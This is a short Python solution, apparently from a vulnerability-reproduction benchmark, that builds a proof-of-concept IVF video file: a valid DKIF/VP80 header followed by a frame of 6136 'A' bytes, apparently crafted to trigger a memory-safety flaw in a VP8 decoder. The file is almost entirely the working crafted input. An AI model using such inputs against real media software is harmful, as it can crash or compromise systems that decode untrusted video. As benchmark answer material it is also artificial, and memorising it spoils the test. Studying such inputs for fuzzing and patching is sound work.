class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'DKIF'
        poc += (0).to_bytes(2, 'little')
        poc += (32).to_bytes(2, 'little')
        poc += b'VP80'
        poc += (320).to_bytes(2, 'little')
        poc += (240).to_bytes(2, 'little')
        poc += (30000).to_bytes(4, 'little')
        poc += (1).to_bytes(4, 'little')
        poc += b'\x00' * 8

        frame_size = 6136
        poc += (frame_size).to_bytes(4, 'little')
        poc += (0).to_bytes(8, 'little')

        poc += b'A' * frame_size

        return poc
